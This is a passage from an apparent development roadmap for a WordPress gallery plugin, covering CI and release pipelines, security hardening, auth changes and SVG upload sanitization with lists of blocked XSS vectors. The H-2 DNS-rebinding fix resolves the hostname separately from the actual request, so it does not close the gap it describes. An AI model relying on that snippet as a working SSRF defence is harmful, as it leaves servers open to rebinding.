3. `wp-plugin/wp-super-gallery/wp-super-gallery.php` → `define('WPSG_VERSION', 'X.Y.Z')`

### Pipeline architecture

#### Workflow 1: `.github/workflows/ci.yml` — Every push/PR

**Triggers:** `push` and `pull_request` to `main` and `develop`  
**Concurrency:** Cancel in-progress runs on same branch  
**Permissions:** `contents: read`

**Job 1: `lint-typecheck`** (~1 min — fast fail gate)
- Checkout → Setup Node 20 (npm cache) → `npm ci`
- `npm run lint` (ESLint flat config)
- `npx tsc --noEmit` (strict TypeScript check)

**Job 2: `test-frontend`** (~2–3 min, depends on `lint-typecheck`)
- Checkout → Setup Node 20 (npm cache) → `npm ci`
- `npm run test:coverage` (Vitest with coverage thresholds: 75% lines / 65% functions / 72% branches / 75% statements)
- `npm run build:wp` (Vite production build + copy assets into plugin dir)
- Upload `coverage/` as artifact

**Job 3: `test-php`** (~3–4 min, independent — runs in parallel with frontend jobs)
- Matrix: PHP 8.1, 8.2, 8.3
- Checkout → Setup PHP (`shivammathur/setup-php@v2` with mbstring, intl, pdo_mysql)
- PHP syntax lint: `find wp-plugin/wp-super-gallery/includes -name '*.php' -exec php -l {} +`
- `composer install` in `wp-plugin/wp-super-gallery/` (includes dev deps for PHPUnit)
- Start wp-env: `npx wp-env start` (WordPress + MySQL in Docker)
- Run PHPUnit via wp-env: `npx wp-env run tests-cli --env-cwd=wp-content/plugins/wp-super-gallery vendor/bin/phpunit`
- 461 tests, 1104 assertions

**Dependency caching:** `~/.npm` and `~/.composer/cache` cached across runs.

#### Workflow 2: `.github/workflows/release.yml` — Manual trigger

**Trigger:** `workflow_dispatch` with inputs:
- `version` (string, default: `"auto"`) — leave as `auto` to compute from commits, or type explicit version (e.g., `1.0.0`)
- `deploy_svn` (boolean, default: `false`) — Deploy to WordPress.org SVN

**Permissions:** `contents: write` (creates tags, releases, commits)

**Steps:**
1. Checkout with full history (`fetch-depth: 0`)
2. Setup Node 20 + PHP 8.3
3. **Compute version** (if `auto`): scan commits since last tag via `scripts/compute-version.sh`
4. **Validate version format** (must match `X.Y.Z`)
5. **Bump version** in all 3 locations → commit with `chore(release): vX.Y.Z`
6. `npm ci` → `npm run test:coverage` → `npm run build:wp` (sanity gate)
7. `composer install --no-dev` in plugin dir (production deps only: sentry, svg-sanitize)
8. **Create distribution ZIP** excluding tests/, phpunit.xml.dist, composer.*, dev artifacts
9. **Create git tag** `vX.Y.Z` → push tag + version commit
10. **Create GitHub Release** via `softprops/action-gh-release@v2` with ZIP attached + auto-generated changelog
11. **(If `deploy_svn` checked)** Deploy to WordPress.org SVN via `10up/action-wordpress-plugin-deploy@v2`

**ZIP contents (included):**
- `wp-super-gallery.php`, `uninstall.php`
- `includes/` (all PHP classes)
- `assets/` (built React SPA + Vite manifest)
- `vendor/` (production Composer deps only)
- `readme.txt`, `LICENSE`
- `languages/`

**ZIP excluded:**
- `tests/`, `phpunit.xml.dist`, `.phpunit.result.cache`
- `composer.json`, `composer.lock`
- `.circleci/`, `.wp-env.json`, `bin/`

#### Workflow 3: `.github/workflows/svn-deploy.yml` — Deploy existing release to WordPress.org

**Trigger:** `workflow_dispatch` with input:
- `tag` (string, required) — e.g., `v0.18.0`

**Steps:**
1. Fetch the GitHub Release for the specified tag
2. Download the attached ZIP artifact (the already-proven build)
3. Extract → deploy to WordPress.org SVN via `10up/action-wordpress-plugin-deploy@v2`

This enables deploying a previously built and tested release to WordPress.org without rebuilding — the exact bytes that were tested are what get deployed.

**Required repository secrets for SVN deploy:**
- `SVN_USERNAME` — WordPress.org username
- `SVN_PASSWORD` — WordPress.org password

#### Workflow 4: `.github/workflows/e2e.yml` — Manual E2E testing

**Trigger:** `workflow_dispatch` (manual only)

**Steps:**
1. Checkout → Setup Node 20 → `npm ci`
2. Install Playwright browsers: `npx playwright install --with-deps chromium`
3. Start wp-env: `npx wp-env start`
4. Build and copy assets: `npm run build:wp`
5. Run Playwright: `npx playwright test --retries=2`
6. Upload `test-results/` on failure

### Branch protection

Configure `main` branch to require:
- `lint-typecheck` ✅
- `test-frontend` ✅
- `test-php` ✅ (all matrix entries: 8.1, 8.2, 8.3)

### Additional quality gates

| Gate | Implementation | Blocking? |
|------|----------------|-----------|
| Dependency caching | `actions/cache` for npm + Composer | N/A (perf) |
| Concurrency groups | `concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }` | N/A (perf) |
| PHP syntax lint | `php -l` on all plugin PHP files | Yes |
| Version consistency | Script validates package.json = plugin header = WPSG_VERSION | Yes (release only) |
| Minimal permissions | `contents: read` on CI, `contents: write` on release | N/A (security) |

### Acceptance criteria

- [ ] Every push/PR triggers frontend lint + type-check + unit tests + build
- [ ] Every push/PR triggers PHP tests on 8.1, 8.2, 8.3 × WP latest
- [ ] Coverage reports uploaded as artifacts
- [ ] Branch protection rules block merging on failure
- [ ] Release workflow computes version from conventional commits (or accepts override)
- [ ] Release workflow bumps all 3 version locations, tags, and creates GitHub Release with ZIP
- [ ] SVN deploy available as checkbox during release or standalone workflow reusing existing ZIP
- [ ] E2E available as manual-trigger workflow
- [ ] Legacy CircleCI config deleted

---

## Track P20-H — Security Hardening Sprint

**Status:** ✅ 12/12 complete (all items done)  
**Priority:** 🟠 Medium — strongly recommended before release  
**Origin:** Action items B-1 through B-12  
**Effort:** ~2–3 dev-days (12 sub-tasks, many trivial)

This track consolidates all Phase B security hardening items into a single sprint with individual sub-tasks.

### H-1. Whitelist props in `parseProps()` [Trivial]

**File:** `src/main.tsx` ~L46–53

```typescript
const ALLOWED_PROPS = new Set(['campaign', 'company']);
const raw = JSON.parse(attr);
return Object.fromEntries(
  Object.entries(raw).filter(([k]) => ALLOWED_PROPS.has(k))
);
```

Prevents shortcode consumers from injecting unexpected keys into the React component tree.

---

### H-2. Fix DNS rebinding in oEmbed SSRF protection [Medium — 3–4 hours]

**File:** `class-wpsg-rest.php` ~L2814–2845

The current check resolves the hostname to validate it's not a private IP, then makes the HTTP request. A DNS rebinding attack can return a public IP for the validation check and a private IP for the actual request.

**Fix:** Use cURL's `CURLOPT_RESOLVE` to pin the resolved IP, or add a `pre_http_request` filter in `wp_remote_get` that validates the resolved IP at connection time. If using the `pre_http_request` approach:

```php
add_filter('pre_http_request', function($preempt, $args, $url) {
    $host = parse_url($url, PHP_URL_HOST);
    $ip = gethostbyname($host);
    if (wpsg_is_private_ip($ip)) {
        return new WP_Error('private_ip', 'Request to private IP blocked');
    }
    return $preempt;
}, 10, 3);
```

---

### H-3. Remove nonce bypass filter [Trivial]

**File:** `class-wpsg-rest.php` ~L606

Remove `apply_filters('wpsg_require_rest_nonce', true)` entirely. If a debug-mode bypass is needed, restrict to `defined('WP_DEBUG') && WP_DEBUG` with an additional `defined('WPSG_ALLOW_NONCE_BYPASS') && WPSG_ALLOW_NONCE_BYPASS` constant check.

---

### H-4. Stop exposing password reset URL in API response [Trivial]

**File:** `class-wpsg-rest.php` ~L3083–3090

Replace:
```php
return ['password_reset_url' => $reset_url];
```
With:
```php
return [
    'created' => true,
    'email_sent' => false,
    'message' => 'User created. Email delivery failed — reset password manually via WP admin.',
];
```

---

### H-5. Delete physical files on overlay removal [Small — 30 min]

**File:** `class-wpsg-overlay-library.php` ~L76–83

Add `wp_delete_file($entry['local_path'])` in the `remove()` method before removing the entry from the array. Check file existence first.

---

### H-6. Add Sentry PII scrubbing [Small — 1–2 hours]

**JS file:** `src/services/monitoring/sentry.ts`
```typescript
beforeSend(event) {
  // Strip Authorization headers from breadcrumbs
  event.breadcrumbs = event.breadcrumbs?.map(b => {
    if (b.data?.headers) delete b.data.headers['Authorization'];
    return b;
  });
  return event;
}
```

**PHP file:** `class-wpsg-sentry.php`
- Fix `captureMessage` to use `Sentry\withScope()` for attaching extra context
- Add `beforeSend` callback that redacts IP addresses and email addresses from event data

---

### H-7. Set default Content Security Policy [Medium — 2–3 hours]

**File:** `wp-super-gallery.php`, `wpsg_add_security_headers()`

```
Content-Security-Policy: script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; frame-src https://www.youtube.com https://player.vimeo.com; connect-src 'self';
```

Allow customization via the existing `wpsg_csp_header` filter. Document the default CSP in the README.

---

### H-8. Implement `ErrorBoundary` → Sentry integration [Small — 30 min]

**File:** `src/components/ErrorBoundary.tsx`

```typescript
componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
  Sentry.captureException(error, { contexts: { react: { componentStack: errorInfo.componentStack } } });
  // Show generic message with Sentry event ID for support
}
```

---

### H-9. Add request timeout to `apiClient` [Small — 30 min]

**File:** `src/services/apiClient.ts`

```typescript
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), timeout ?? 30_000);
try {
  const response = await fetch(url, { ...options, signal: controller.signal });
  // ...
} finally {
  clearTimeout(timeoutId);
}
```

---

### H-10. Whitelist `status`/`visibility` filter values [Trivial]

**File:** `class-wpsg-rest.php` ~L665–675

```php
$allowed_statuses = ['draft', 'active', 'archived'];
if (!empty($status) && !in_array($status, $allowed_statuses, true)) {
    return new WP_REST_Response(['message' => 'Invalid status filter'], 400);
}
$allowed_visibilities = ['public', 'private'];
if (!empty($visibility) && !in_array($visibility, $allowed_visibilities, true)) {
    return new WP_REST_Response(['message' => 'Invalid visibility filter'], 400);
}
```

---

### H-11. Consistently `encodeURIComponent` dynamic URL segments [Small — 1 hour]

**File:** `src/services/apiClient.ts`

Audit all methods interpolating `id`, `templateId`, or other dynamic values into URL paths. Wrap each in `encodeURIComponent()`:

```typescript
// Before:
`${this.baseUrl}/campaigns/${id}/export`
// After:
`${this.baseUrl}/campaigns/${encodeURIComponent(id)}/export`
```

---

### H-12. Gate `console.info` behind DEV check [Trivial]

**File:** `src/services/monitoring/webVitals.ts` ~L39

```typescript
if (import.meta.env.DEV) console.info('[WPSG][Vitals]', metric);
```

---

### Track P20-H acceptance criteria (aggregate)

- [ ] All 12 sub-tasks implemented and individually verified
- [ ] No new lint or type errors introduced
- [ ] PHPUnit tests added for H-2 (DNS rebinding), H-10 (status/visibility whitelist)
- [ ] Vitest tests added for H-1 (props whitelist), H-9 (request timeout), H-11 (URL encoding)

---

## Track P20-I — Performance Optimizations

**Status:** ✅ Complete (I-1 through I-6 all done)  
**Priority:** 🔵 Medium — not release-blocking but impacts production scale  
**Origin:** Action items C-1 through C-6  
**Effort:** ~3–5 dev-days

### I-1. Migrate layout templates to CPT storage [Large — 1–2 days]

**Problem:** All layout templates stored in a single `wp_options` row — O(N) reads/writes, 512 KB practical limit, no per-template caching.

**Approach:**
- The `wpsg_layout_template` CPT already exists
- Store each template as a CPT post; slots/background/layers as individual `post_meta` entries
- One-time migration triggered by `admin_notices` hook (see AD-6)
- Backup existing options data before migration
- WP-CLI rollback: `wp wpsg migrate-layouts rollback`

**Files:** `class-wpsg-layout-templates.php` (rewrite storage methods), `class-wpsg-db.php` (migration logic)

---

### I-2. Implement media usage reverse index [Medium — 4–6 hours]

**Problem:** Finding which campaigns use a given media item requires a full-table scan of all campaign meta.

**Approach:**
- Create `{$prefix}wpsg_media_refs` table: `(id, media_id, campaign_id, created_at)`
- Populate on campaign save/update (hook into `apply_campaign_meta()`)
- Replace iterative PHP scan with: `SELECT campaign_id FROM wpsg_media_refs WHERE media_id = %s`
- Backfill existing data via a one-time migration

**Files:** `class-wpsg-db.php` (table creation + migration), `class-wpsg-rest.php` (media usage endpoint)

---

### I-3. Replace LIKE-based cache invalidation [Small — 1–2 hours]

**Problem:** 4× `DELETE ... WHERE option_name LIKE '%wpsg_%'` per mutation — scans the entire options table.

**Approach:** Cache version counter (see AD-5):
```php
$version = intval(get_option('wpsg_cache_version', 1));
// In cache key generation: include $version
// On mutation: update_option('wpsg_cache_version', $version + 1);
```
Stale keys expire via natural TTL. No DELETE queries needed.

**Files:** `class-wpsg-thumbnail-cache.php`, `class-wpsg-rest.php` (cache-related methods)

---

### I-4. Lazy-load dockview [Small — 1–2 hours]

**Problem:** Dockview bundle (~120 KB gzip) loads for all admin users even if they never open the Layout Builder.

**Approach:**
```typescript
const LayoutBuilderModal = React.lazy(() => import('./LayoutBuilder/LayoutBuilderModal'));
```
The Vite manual chunk for dockview is already separate — just need the dynamic import trigger and a `<Suspense>` wrapper.

**Files:** `src/components/Admin/AdminPanel.tsx` (lazy import), `src/components/Admin/LayoutBuilder/LayoutBuilderModal.tsx` (verify chunk boundary)

---

### I-5. Async alert email dispatch [Small — 1–2 hours]

**Problem:** `wp_mail()` runs on the hot path of request processing, adding latency to API responses when alerts fire.

**Approach:**
- Queue alerts to a transient or lightweight custom table
- Process via a 1-minute WP-Cron job
- Fallback: if cron is disabled (`DISABLE_WP_CRON`), send synchronously

**Files:** `class-wpsg-monitoring.php`, `wp-super-gallery.php` (cron registration)

---

### I-6. Shared React root for multi-shortcode pages [Medium — 3–5 hours]

**Problem:** Each `[wp_super_gallery]` shortcode on a page creates an independent React root with its own SWR cache, auth context, and Mantine theme provider. On a page with 3 galleries, this means 3× network requests, 3× memory, 3× theme renders.

**Approach** (see AD-7):
```typescript
// Single root discovers all mount points
const mountPoints = document.querySelectorAll('.wp-super-gallery');
const root = createRoot(container);
root.render(
  <SharedProviders>
    {Array.from(mountPoints).map(el => 
      createPortal(<GalleryInstance props={parseProps(el)} />, el)
    )}
  </SharedProviders>
);
```

**Risk:** This is the highest-risk item in P20-I — it changes the rendering model. Do last, with extensive testing.

**Files:** `src/main.tsx` (root mounting logic), `src/App.tsx` (shared provider extraction)

---

### Track P20-I acceptance criteria (aggregate)

- [x] Layout template CRUD performance improved (measurable via WP Query Monitor or profiling)
- [x] Media usage lookups use indexed reverse table instead of full scan
- [x] No `LIKE '%wpsg_%'` queries on mutation paths
- [x] Dockview chunk only loads when Layout Builder modal opens
- [x] Alert emails queued and dispatched via cron (verified via WP-Cron debug tools)
- [x] Multi-shortcode page shares one React root with unified SWR cache (behind feature flag)
- [x] All existing tests pass after each sub-task (build verified)

---

## Track P20-J — Plugin Directory Preparation

**Status:** ✅ Complete (J-1, J-3, J-4 done; J-2 bootstrap done, REST strings deferred)  
**Priority:** 🔵 Medium — required for WordPress.org submission  
**Origin:** Action items D-1, D-2, D-3, D-5  
**Effort:** ~2–3 dev-days

### J-1. Create `readme.txt` [Medium — 2–3 hours]

Standard WordPress plugin directory format:

```
=== WP Super Gallery ===
Contributors: ...
Tags: gallery, media, campaign, layout builder
Requires at least: 6.0
Tested up to: 6.7
Requires PHP: 8.0
Stable tag: 0.18.0
License: GPLv2 or later
License URI: https://www.gnu.org/licenses/gpl-2.0.html

== Description ==
...
== Installation ==
...
== Frequently Asked Questions ==
...
== Screenshots ==
...
== Changelog ==
...
```

Derive the changelog from existing `CHANGELOG.md`. Add screenshots of admin panel, layout builder, and frontend gallery.

**Files:** `wp-plugin/wp-super-gallery/readme.txt` (new)

---

### J-2. Add i18n support [Medium-Large — 1–2 days]

**PHP:**
- Wrap all user-facing strings in `__('...', 'wp-super-gallery')` / `_e('...', 'wp-super-gallery')`
- Generate `.pot` file: `wp i18n make-pot wp-plugin/wp-super-gallery wp-plugin/wp-super-gallery/languages/wp-super-gallery.pot`

**JS:**
- Evaluate `@wordpress/i18n` vs a lightweight alternative
- Wrap user-facing strings in admin panel components
- Generate JS `.pot` file

**Files:** All PHP files with user-facing strings, all React components with user-facing strings, `wp-plugin/wp-super-gallery/languages/` directory (new)

---

### J-3. Separate Composer dev dependencies [Trivial — 15 min]

**File:** `wp-plugin/wp-super-gallery/composer.json`

Move `phpunit/phpunit` and `yoast/phpunit-polyfills` from `require` to `require-dev`. Production builds should use `composer install --no-dev`.

---

### J-4. Implement custom capability type for CPT [Small — 1–2 hours]

**File:** `class-wpsg-cpt.php`

Set `capability_type => 'wpsg_campaign'` in the CPT registration and map capabilities:

```php
'capability_type' => 'wpsg_campaign',
'map_meta_cap'    => true,
'capabilities'    => [
    'edit_post'          => 'edit_wpsg_campaign',
    'read_post'          => 'read_wpsg_campaign',
    'delete_post'        => 'delete_wpsg_campaign',
    'edit_posts'         => 'edit_wpsg_campaigns',
    'publish_posts'      => 'publish_wpsg_campaigns',
    'read_private_posts' => 'read_private_wpsg_campaigns',
],
```

Grant these capabilities to `administrator` and `wpsg_admin` roles on plugin activation. This prevents Editor-role users from managing campaigns through the native WP admin post editor.

---

### Track P20-J acceptance criteria (aggregate)

- [ ] `readme.txt` passes the WordPress.org plugin readme validator
- [ ] All PHP user-facing strings wrapped in `__()` / `_e()`
- [ ] `.pot` file generated and loadable
- [ ] `composer install --no-dev` does not include PHPUnit
- [ ] Editor-role user cannot access campaigns via native WP admin (only via WPSG admin panel with `manage_wpsg`)

---

## Track P20-K — JWT Auth Hardening (Nonce-Only Default)

**Status:** Not started  
**Priority:** 🔴 Critical — ship-blocking  
**Origin:** Action item A-1; decision: Option 1 (see [JWT_AUTH_ANALYSIS.md](JWT_AUTH_ANALYSIS.md))  
**Effort:** Small–Medium (1–2 days)

### Problem

JWT tokens are stored in `localStorage` (`wpsg_access_token`, `wpsg_user`, `wpsg_permissions`), readable by any XSS on the same origin. For the default same-origin deployment (admin panel + shortcode on the same WordPress site), this is unnecessary — WP cookie + nonce auth is already active and inherently safe from JavaScript-based token theft.

### Approach

1. **Default path (same-origin):** Remove JWT from the auth flow entirely. Rely on WP login cookie (`httpOnly`) + `X-WP-Nonce` from `__WPSG_CONFIG__.restNonce`. No tokens in `localStorage`.
2. **Opt-in path (cross-origin/headless):** Gate behind `define('WPSG_ENABLE_JWT_AUTH', true)` in `wp-config.php`. When enabled, `WpJwtProvider` is instantiated and the login form appears.
3. **Code preservation:** Comment out (not delete) JWT code blocks with `// [WPSG_JWT_DISABLED] — Preserved for future standalone SPA use. Enable via WPSG_ENABLE_JWT_AUTH constant.` tags. This preserves the framework for Option 2 (in-memory tokens + refresh cookie) documented in [FUTURE_TASKS.md](FUTURE_TASKS.md).

### Tasks

| # | Task | File(s) |
|---|------|---------|
| K-1 | Gate `WpJwtProvider` instantiation behind `WPSG_ENABLE_JWT_AUTH` | `src/App.tsx` or `src/main.tsx` — wrap provider creation in `if (window.__WPSG_CONFIG__?.enableJwt)` |
| K-2 | Remove `localStorage` usage from default auth flow | `src/services/auth/WpJwtProvider.ts` — comment out `localStorage.setItem/getItem/removeItem` blocks |
| K-3 | Make `apiClient` nonce-only by default | `src/services/apiClient.ts` `buildAuthHeaders()` — send `X-WP-Nonce` only when no auth provider configured |
| K-4 | Add nonce-based auth state detection | `src/contexts/AuthContext.tsx` — detect authenticated state via lightweight `/permissions` call with cookie auth when no JWT provider present |
| K-5 | PHP: expose `enableJwt` in shortcode config | `wp-super-gallery.php` — add `'enableJwt' => defined('WPSG_ENABLE_JWT_AUTH') && WPSG_ENABLE_JWT_AUTH` to `__WPSG_CONFIG__` output |
| K-6 | Add nonce heartbeat refresh | `src/hooks/useNonceHeartbeat.ts` (new) — poll `wp_create_nonce('wp_rest')` via a lightweight endpoint every 20 minutes to prevent stale nonce in long-running tabs |
| K-7 | Cookie-based login/logout REST endpoints | `class-wpsg-rest.php` — `POST /auth/login` calls `wp_signon()`, sets WP auth cookie, returns user + nonce; `POST /auth/logout` calls `wp_logout()`, returns guest nonce. Rate-limited, fires `wp_login_failed` hook for brute-force plugin compat. Avoids redirecting to `wp-login.php`, preserving branded UX and hiding WordPress identity. |
| K-8 | Wire AuthContext login/logout to cookie endpoints | `src/contexts/AuthContext.tsx` — `login()` calls `/auth/login` in nonce-only mode, updates global nonce; `logout()` calls `/auth/logout`, resets to guest nonce. In-app LoginForm modal works identically in both JWT and nonce modes. |
| K-9 | Update documentation | `README.md`, `docs/WP_JWT_SETUP.md` — document the `WPSG_ENABLE_JWT_AUTH` constant and the migration from JWT to nonce-only |
| K-10 | Configurable session idle timeout | `src/hooks/useIdleTimeout.ts` (new) — auto-logout hook that monitors mousemove / keydown / touch / scroll / pointer events. Fires `logout()` after `sessionIdleTimeoutMinutes` of inactivity. Disabled when value is 0 (default). Setting stored in `class-wpsg-settings.php` (range 0–480), exposed in SettingsPanel General tab under a "Security" divider. 8 Vitest tests in `useIdleTimeout.test.ts`. |
| K-8 | Add FUTURE_TASKS entry for Option 2 | `docs/FUTURE_TASKS.md` — record in-memory tokens + httpOnly refresh cookie as a future enhancement for the standalone SPA version |

### Acceptance criteria

- [ ] No tokens in `localStorage` or `sessionStorage` in the default (no-constant) configuration
- [ ] Admin panel and shortcode galleries work correctly with cookie + nonce auth only
- [ ] Setting `WPSG_ENABLE_JWT_AUTH` to `true` re-enables the full JWT login flow
- [ ] Commented-out JWT code blocks are clearly tagged with `[WPSG_JWT_DISABLED]`
- [ ] In-app LoginForm modal works in nonce-only mode without redirecting to `wp-login.php`
- [ ] Cookie login endpoint fires `wp_login_failed` hook for brute-force protection plugin compatibility
- [ ] Nonce heartbeat prevents 403s in tabs open longer than 24 hours
- [ ] Vitest tests cover both auth modes (nonce-only default + JWT-enabled)
- [ ] Session idle timeout auto-logs out after configured minutes of inactivity (0 = disabled by default)

---

## Layout Builder QA — Round 2 Fixes

**Status:** ✅ Complete  
**Date:** March 7, 2026  

### Bug Fixes

| # | Issue | Root Cause | Fix |
|---|-------|-----------|-----|
| QA-R2-1 | Slot deselected after drag-resize | Canvas used `onClick` for selection clearing; after resize the browser fires `click` on the canvas background (common ancestor of mousedown/mouseup) | Changed canvas to `onMouseDown` for selection clearing — `mousedown` only fires on the actual target, preventing accidental deselection after drag/resize (`LayoutCanvas.tsx`) |
| QA-R2-2 | CSS mask had no visible effect with black/white PNGs | Default `mask-mode` is `alpha` (transparency-based). Fully opaque B/W PNGs have no alpha variation | Added `mask-mode: luminance` as default (white=visible, black=hidden). New `maskMode` field on `LayoutSlot` type with UI toggle (Luminance/Alpha). Applied in both builder (`LayoutSlotComponent.tsx`) and gallery renderer (`LayoutBuilderGallery.tsx`) |
| QA-R2-3 | Slot name not persisted on save/reload | Two causes: (1) SWR cache stale after save — `mutate()` triggered async revalidation but reopening the builder before it completed showed old data. (2) `setTemplate()` (called in save flow) cleared selection. | (1) `handleBuilderSaved` now does optimistic SWR cache update with the saved template. (2) `setTemplate()` accepts `{ preserveSelection: true }` option, used by `handleSave()`. |
| QA-R2-4 | `lockAspectRatio` stripped on first save (create) | PHP `sanitize_slots()` whitelist didn't include `lockAspectRatio` — field silently dropped during `create()` | Added `lockAspectRatio` (boolean, default false) to `sanitize_slots()` in `class-wpsg-layout-templates.php`. Also added `maskMode` to the whitelist. |

### UX Improvements

| # | Feature | Description | Files |
|---|---------|-------------|-------|
| QA-R2-5 | Inline property labels | All property labels now display inline with their input fields (e.g. "Name [textbox]" instead of stacked layout). Uses a reusable `PropRow` component. | `SlotPropertiesPanel.tsx` |
| QA-R2-6 | Prominent section headers with dividers | Section labels (Position, Size, Shape, etc.) now use uppercase bold text with a bottom border rule instead of plain Mantine `Divider` labels. Uses `SectionHeader` component. | `SlotPropertiesPanel.tsx` |
| QA-R2-7 | Compact property spacing | Stack gap reduced from `sm` to `4px`. Inputs use `variant="filled"` for visual density. Overall panel is significantly more compact. | `SlotPropertiesPanel.tsx` |
| QA-R2-8 | Adobe-style link/unlink aspect ratio | Replaced `Switch` toggle with a `link/unlink` icon button between W and H inputs. Blue filled when locked, subtle gray when unlocked. Tooltip shows current state. | `SlotPropertiesPanel.tsx` (uses `IconLink`/`IconUnlink`) |
| QA-R2-9 | Transparent/None background mode | New segmented control: None \| Color \| Gradient \| Image. "None" gives a fully transparent canvas background. | `LayoutBuilderMediaPanel.tsx`, `LayoutCanvas.tsx`, `LayoutBuilderGallery.tsx` |
| QA-R2-10 | Gradient background system | Full gradient support: 5 direction presets (→ ↓ ↗ ↘ ◎) with visual icon buttons, 2-step and 3-step gradients, RGBA color inputs with alpha. Live preview swatch. CSS output: `linear-gradient()` / `radial-gradient()`. | `LayoutBuilderMediaPanel.tsx`, `LayoutCanvas.tsx`, `LayoutBuilderGallery.tsx`, `src/utils/gradientCss.ts` (new) |
| QA-R2-11 | Compact background options | Background section uses inline label/control layout matching the slot properties panel style. | `LayoutBuilderMediaPanel.tsx` |

### Type & Backend Changes

- `LayoutSlot.maskMode?: 'luminance' | 'alpha'` — new field (`src/types/index.ts`)
- `LayoutTemplate.backgroundMode?: BackgroundMode` — 'none' | 'color' | 'gradient' | 'image' (default: 'color')
- `LayoutTemplate.backgroundGradientDirection?: GradientDirection` — 5 presets
- `LayoutTemplate.backgroundGradientStops?: GradientStop[]` — 2–3 entries with RGBA color + position
- PHP `sanitize_slots()` — added `maskMode`, `lockAspectRatio` to slot whitelist
- PHP `build_template()` — added `backgroundMode`, `backgroundGradientDirection`, `backgroundGradientStops` with sanitization
- PHP `sanitize_gradient_stops()` — new method, validates color via `sanitize_css_value('color')`, clamps positions 0–100, limits to 3 entries

---

## Track P20-L — SVG Upload Sanitization (Dual-Layer)

**Status:** ✅ Complete  
**Priority:** 🔴 High — ship-blocking  
**Origin:** Action item A-3; decision: Option 2 with enhancements (see [SVG_UPLOAD_ANALYSIS.md](SVG_UPLOAD_ANALYSIS.md))  
**Effort:** Medium (3–5 hours)

### Problem

SVG overlays can contain `<script>` tags, event handlers (`onload`, `onclick`), `<foreignObject>` elements, `javascript:` URIs, and CSS-based data exfiltration payloads. The current upload handler allows `image/svg+xml` with no content sanitization — only MIME type validation.

### Approach — Dual-layer sanitization

| Layer | Library | When | Purpose |
|-------|---------|------|---------|
| **Server (PHP)** | `enshrined/svg-sanitize` | Upload time (write-path) | Authoritative security gate — strips dangerous content before file hits disk |
| **Client (JS)** | DOMPurify (already a project dependency) | Upload preview + render time | Defence-in-depth — catches any server-side sanitizer bypass |

### Custom CSS sanitization within SVG `<style>` blocks

Rather than stripping `<style>` blocks entirely (which breaks legitimate design tool output), apply targeted CSS validation:

**Block:**
- `url()` with external/`data:text/*`/`data:image/svg+xml` URIs
- `@import` rules
- `expression()`, `-moz-binding`, `behavior:`
- Property values containing `;` followed by what looks like a new declaration

**Allow:**
- `url(#internalId)` — references to SVG-internal gradients, filters, clip-paths
- `data:image/(png|jpeg|webp|gif)` embedded raster images
- `@font-face` with embedded `data:font/*` URIs only (no external font URLs)
- Standard CSS properties with literal values

### Allowlist-based URI validation

All URI-like strings in the SVG are validated regardless of tag context:

| URI pattern | Action |
|-------------|--------|
| `#localId` (fragment reference) | ✅ Allow — essential for SVG internal refs |
| `data:image/(png\|jpeg\|webp\|gif);base64,...` | ✅ Allow — embedded raster images |
| `data:font/(woff2?\|ttf\|otf);base64,...` | ✅ Allow — embedded fonts in `@font-face` |
| `data:image/svg+xml;...` | ❌ Block — recursive SVG could contain scripts |
| `data:text/html;...` | ❌ Block — HTML injection vector |
| `javascript:...` | ❌ Block — direct XSS |
| `https://...` or any external URL | ❌ Block — external resource loading / tracking (`removeRemoteReferences(true)`) |

### Tasks

| # | Task | File(s) |
|---|------|---------|
| L-1 | Add `enshrined/svg-sanitize` to composer | `wp-plugin/wp-super-gallery/composer.json` — `"enshrined/svg-sanitize": "^0.20"` in `require` |
| L-2 | Server-side sanitization in upload handler | `class-wpsg-overlay-library.php` `handle_upload()` — after MIME check, read SVG → sanitize with `removeRemoteReferences(true)` + `minify(true)` → write sanitized content back → reject if empty |
| L-3 | Custom CSS validator for SVG `<style>` blocks | `class-wpsg-overlay-library.php` (new method `sanitize_svg_css()`) — parse CSS declarations, allowlist-validate URIs per the table above, strip dangerous patterns |
| L-4 | Allowlist URI validator | `class-wpsg-overlay-library.php` (new method `validate_svg_uri()`) — regex-based allowlist for all URI patterns found in SVG attributes |
| L-5 | Client-side DOMPurify at upload preview | Overlay upload modal component — sanitize SVG string with `DOMPurify.sanitize(svg, { USE_PROFILES: { svg: true, svgFilters: true } })` before rendering preview |
| L-6 | Client-side DOMPurify at render time | Gallery/builder overlay render path — sanitize before inserting into Shadow DOM |
| L-7 | Ensure `<img>` tag rendering for overlays | Audit all overlay render paths — confirm `<img src="...">` is used, not inline `<svg>`, `<object>`, or `<embed>` |
| L-8 | SVG content headers via `.htaccess` rule | `wp-plugin/wp-super-gallery/.htaccess` or documented nginx config — serve files from `wpsg-overlays/` with `Content-Security-Policy: script-src 'none'` |
| L-9 | PHPUnit tests | `WPSG_SVG_Sanitization_Test.php` (new) — malicious SVGs (script, onload, foreignObject, javascript: URI, CSS exfil, polyglot), clean SVGs with gradients/filters/fonts, verify round-trip integrity |
| L-10 | Vitest tests for DOMPurify integration | Extend overlay component tests — verify DOMPurify strips scripts from SVG strings at both preview and render paths |

### Re-serialization as polyglot mitigation

The `enshrined/svg-sanitize` library parses the SVG as strict XML, strips dangerous elements, and **re-serializes clean XML output**. This re-serialization inherently breaks polyglot file properties — any dual-format tricks (SVG/HTML polyglots, SVG/JS polyglots) embedded in the original file are destroyed during the parse→strip→serialize round-trip. No additional polyglot-specific code is needed.

### Acceptance criteria

- [ ] SVGs containing `<script>`, `onload`, `<foreignObject>`, `javascript:` URIs, or CSS exfiltration payloads are stripped at upload
- [ ] Clean SVGs with gradients, filters, clip paths, and embedded raster images pass through intact
- [ ] `@font-face` with embedded `data:font/*` is preserved; external font URLs are stripped
- [ ] DOMPurify sanitizes SVG content at both upload-preview and render-time in the frontend
- [ ] All overlay render paths use `<img>` tags (not inline SVG)
- [ ] SVGs served from `wpsg-overlays/` include `Content-Security-Policy: script-src 'none'` response header
- [ ] PHPUnit tests cover all attack vectors listed in [SVG_UPLOAD_ANALYSIS.md](SVG_UPLOAD_ANALYSIS.md) §1
- [ ] Vitest tests verify DOMPurify integration at both touchpoints

---

## Execution Priority

| Sprint | Track | Prerequisite | Risk | Status |
|--------|-------|-------------|------|--------|
| 1 | **P20-A** — Rate limiting defaults | None | Low | ✅ Complete |
| 1 | **P20-C** — CSS value sanitization | None | Low | ✅ Complete |
